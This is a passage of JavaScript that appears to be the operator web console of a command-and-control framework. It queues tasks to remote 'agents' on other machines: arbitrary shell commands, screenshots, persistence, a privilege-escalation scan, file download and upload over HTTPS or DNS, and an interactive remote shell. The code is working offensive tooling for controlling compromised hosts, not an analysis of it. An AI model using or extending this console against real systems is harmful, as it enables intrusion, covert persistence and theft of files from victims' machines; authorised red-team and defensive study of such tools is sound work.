      appendOutput('[>] cancel ' + taskID.slice(0, 8) + '  (id: ' + data.task_id.slice(0, 8) + ')', '', targetAgentID);
      await refreshActiveAgent();
    }
  } catch (err) {
    appendOutput('[-] cancel request error: ' + err.message, '', targetAgentID);
  } finally {
    setQueueBusy(false, '');
    updateCancellationControls();
  }
}

async function queueInteractiveStart() {
  if (!activeAgentID || taskRequestInFlight) return;

  const targetAgentID = activeAgentID;
  setQueueBusy(true, 'Requesting interactive mode...');

  try {
    const data = await submitTask(targetAgentID, { type: 'interactive', payload: 'start' });
    if (!data) return;

    appendOutput('[>] interactive start  (id: ' + data.task_id.slice(0, 8) + ')', '', targetAgentID);
    enterInteractiveMode(targetAgentID);
  } catch (err) {
    appendOutput('[-] interactive start failed: ' + err.message, '', targetAgentID);
  } finally {
    setQueueBusy(false, '');
  }
}

function buildTaskFromComposer() {
  const rawValue = $('task-input').value;

  switch (selectedTaskType) {
    case 'shell':
      if (!rawValue.trim()) {
        setTaskInputError('Enter a shell command before queueing the task.');
        return null;
      }
      return { type: 'shell', payload: rawValue };
    case 'ps':
      return { type: 'ps', payload: '' };
    case 'screenshot':
      return { type: 'screenshot', payload: '' };
    case 'snapshot':
      return { type: 'snapshot', payload: '' };
    case 'persistence':
      return { type: 'persistence', payload: '' };
    case 'peas':
      return { type: 'peas', payload: '' };
    case 'download': {
      const path = rawValue.trim();
      if (!path) {
        setTaskInputError('Enter a remote file path before queueing the download.');
        return null;
      }
      if (hasInvalidPathChars(path)) {
        setTaskInputError('Download paths cannot contain line breaks or null bytes.');
        return null;
      }
      return { type: 'download', payload: path };
    }
    case 'sleep': {
      const value = rawValue.trim();
      const seconds = Number.parseInt(value, 10);
      if (!/^\d+$/.test(value) || !Number.isFinite(seconds) || seconds < 1 || seconds > MAX_SLEEP_SECONDS) {
        setTaskInputError('Sleep must be a whole number between 1 and 86400.');
        return null;
      }
      return { type: 'sleep', payload: value };
    }
    case 'kill':
      return { type: 'kill', payload: '' };
    case 'interactive':
      return { type: 'interactive', payload: 'start' };
    default:
      return null;
  }
}

function recordTaskHistory(type, payload) {
  taskHistory.push({ type, payload });
  if (taskHistory.length > 50) taskHistory.shift();
  taskHistoryIndex = -1;
}

function formatTaskPayloadEcho(task) {
  if (!task.payload) return '';
  if (task.type === 'shell') return ' ' + task.payload;
  return ' ' + task.payload;
}

async function sendInteractiveCommand() {
  if (taskRequestInFlight) return;

  const raw = $('task-input').value;
  if (!raw.trim() || !interactiveReady) return;

  const command = raw.trim();
  if (command === 'exit' || command === 'quit') {
    $('task-input').value = '';
    exitInteractiveMode(true);
    return;
  }

  const prompt = activeAgent && activeAgent.hostname ? activeAgent.hostname + ' $ ' : '$ ';
  const targetAgentID = activeAgentID;
  const restoreFocus = shouldPersistCommandFocus();
  setQueueBusy(true, 'Queueing interactive command...');

  try {
    const data = await submitTask(targetAgentID, { type: 'shell', payload: raw });
    if (!data) return;

    $('task-input').value = '';
    interactiveHistory.push(raw);
    if (interactiveHistory.length > 100) interactiveHistory.shift();
    interactiveHistoryIndex = -1;
    appendOutput(prompt + raw, 'interactive-cmd', targetAgentID);
  } catch (err) {
    appendOutput('[!] network error: ' + err.message, '', targetAgentID);
  } finally {
    setQueueBusy(false, '');
    restoreCommandFocusIfNeeded(restoreFocus, false);
  }
}

function enterInteractiveMode(agentID) {
  interactiveMode = true;
  interactiveReady = false;
  $('output').classList.add('interactive-active');
  document.querySelector('.command-line').hidden = false;
  if (taskTypeSelect) taskTypeSelect.hidden = true;
  $('send-btn').hidden = true;
  $('choose-file-btn').hidden = true;
  $('browse-path-btn').hidden = true;
  $('upload-filename-label').hidden = true;
  $('exit-interactive-btn').hidden = false;

  const prompt = activeAgent && activeAgent.hostname ? activeAgent.hostname + ' $' : '$';
  $('interactive-prompt').textContent = prompt;
  $('interactive-prompt').hidden = false;

  $('task-help').classList.remove('error-copy');
  $('composer-note').classList.remove('error-note');
  $('task-help').textContent = 'Interactive shell is active. Type exit to return to queued task mode.';
  $('composer-note').textContent = 'Beacon frequency is temporarily elevated while interactive mode is active.';

  $('task-input').value = '';
  $('task-input').disabled = true;
  $('task-input').placeholder = 'Waiting for session...';

  const banner = document.createElement('div');
  banner.className = 'interactive-banner';
  banner.textContent = 'INTERACTIVE SHELL ' + (activeAgent && activeAgent.hostname ? activeAgent.hostname : agentID.slice(0, 8));
  $('output').appendChild(banner);
  scrollOutputToBottom();
  updateTaskContextStatus();
  startSSEStream(agentID, true);
}

function enableInteractiveInput() {
  interactiveReady = true;
  $('task-input').disabled = false;
  $('task-input').placeholder = 'Enter a command (exit to return)';
  $('task-input').focus();
}

function exitInteractiveMode(sendStop) {
  if (!interactiveMode) return;

  interactiveMode = false;
  interactiveReady = false;
  $('output').classList.remove('interactive-active');
  $('task-input').value = '';
  $('task-input').disabled = false;
  $('task-input').placeholder = TASK_TYPES[selectedTaskType].placeholder;

  if (sendStop) {
    const end = document.createElement('div');
    end.className = 'interactive-end';
    end.textContent = 'INTERACTIVE MODE ENDED';
    $('output').appendChild(end);
    scrollOutputToBottom();
  }

  applyTaskTypeUI();

  if (sendStop && activeAgentID && token) {
    apiFetch('/api/agents/' + activeAgentID + '/task', {
      method: 'POST',
      body: JSON.stringify({ type: 'interactive', payload: 'stop' }),
    }).catch(() => {});
  }

  updateTaskContextStatus();
}

async function startSSEStream(agentID, reportErrors) {
  stopSSEStream();
  const streamID = ++sseStreamID;

  try {
    const resp = await apiFetch('/api/agents/' + agentID + '/terminal/stream', {
      headers: { Accept: 'text/event-stream' },
    });
    if (streamID !== sseStreamID || agentID !== activeAgentID) return;

    if (!resp.ok || !resp.body) {
      const message = await readResponseMessage(resp, 'interactive stream unavailable');
      if (reportErrors) appendOutput('[!] ' + message, '', agentID);
      return;
    }

    const reader = resp.body.getReader();
    sseReader = reader;
    const decoder = new TextDecoder();
    let buffer = '';

    while (true) {
      const { done, value } = await reader.read();
      if (done) break;
      if (streamID !== sseStreamID || agentID !== activeAgentID) break;

      buffer += decoder.decode(value, { stream: true });
      const lines = buffer.split('\n');
      buffer = lines.pop();

      for (const line of lines) {
        if (!line.startsWith('data: ')) continue;

        try {
          if (streamID === sseStreamID && agentID === activeAgentID) {
            handleTaskOutput(JSON.parse(line.slice(6)));
          }
        } catch (_) {
          // Ignore malformed SSE fragments and keep the stream alive.
        }
      }
    }
  } catch (err) {
    if (reportErrors && interactiveMode) appendOutput('[!] stream disconnected: ' + err.message, '', agentID);
  } finally {
    if (streamID === sseStreamID) sseReader = null;
  }
}

function stopSSEStream() {
  sseStreamID++;
  if (!sseReader) return;
  sseReader.cancel().catch(() => {});
  sseReader = null;
}

function acceptUploadFile(file) {
  if (interactiveMode || !activeAgentID) return;

  if (file.size > MAX_UPLOAD_BYTES) {
    appendOutput('[-] file too large: ' + file.name + ' (' + formatFileSize(file.size) + '). Max is ' + formatFileSize(MAX_UPLOAD_BYTES) + '.');
    return;
  }

  pendingUploadFile = file;
  if (selectedTaskType !== 'upload') {
    setTaskType('upload');
  } else {
    applyTaskTypeUI();
    focusPrimaryInput(false);
  }
}

function clearPendingUpload() {
  pendingUploadFile = null;
  if (!interactiveMode) updateUploadFilenameLabel();
  if (!interactiveMode && selectedTaskType === 'upload') applyTaskTypeUI();
}

async function queueUploadTask() {
  if (!pendingUploadFile || !activeAgentID || taskRequestInFlight) return;

  const remotePath = $('task-input').value.trim();
  if (!remotePath) {
    setTaskInputError('Enter a remote destination path before sending the upload.');
    return;
  }

  if (hasInvalidPathChars(remotePath)) {
    setTaskInputError('Upload paths cannot contain line breaks or null bytes.');
    return;
  }
  if (activeAgent && activeAgent.transport === 'dns' && pendingUploadFile.size > 6 * 1024) {
    setTaskInputError('This session last checked in over DNS. Large uploads require HTTPS transport.');
    appendOutput('[-] upload requires HTTPS transport for files larger than a few KB; reconnect the session over HTTPS and try again.', '', activeAgentID);
    return;
  }

  const file = pendingUploadFile;
  const targetAgentID = activeAgentID;
  hidePathSuggestions();
  setQueueBusy(true, 'Submitting upload...');

  const reader = new FileReader();
  reader.onload = async e => {
    const dataURL = String(e.target.result || '');
    const comma = dataURL.indexOf(',');
    if (comma < 0) {
      appendOutput('[-] upload read error: unable to encode local file', '', targetAgentID);
      setQueueBusy(false, '');
      return;
    }
    const payload = remotePath + ':' + dataURL.slice(comma + 1);

    try {
      const data = await submitTask(targetAgentID, { type: 'upload', payload });
      if (!data) return;
      appendOutput('[>] upload ' + file.name + ' -> ' + remotePath + '  (id: ' + data.task_id.slice(0, 8) + ')', '', targetAgentID);
      pendingUploadFile = null;
      $('task-input').value = '';
      clearActiveTaskDraft('upload');
      updateUploadFilenameLabel();
      focusPrimaryInput(false, true);
    } catch (err) {
      appendOutput('[-] upload network error: ' + err.message, '', targetAgentID);
    } finally {
      setQueueBusy(false, '');
    }
  };
  reader.onerror = () => {
    appendOutput('[-] upload read error: unable to read local file', '', targetAgentID);
    setQueueBusy(false, '');
  };

  reader.readAsDataURL(file);
}

function basenameFromPath(path) {
  const value = String(path || '').replace(/[\\/]+$/, '');
  const idx = Math.max(value.lastIndexOf('/'), value.lastIndexOf('\\'));
  return sanitizeArchiveEntryName(idx >= 0 ? value.slice(idx + 1) : value) || 'download.bin';
}

function hasInvalidPathChars(value) {
  return !value || value.length > MAX_REMOTE_PATH || /[\u0000\r\n]/.test(value);
}
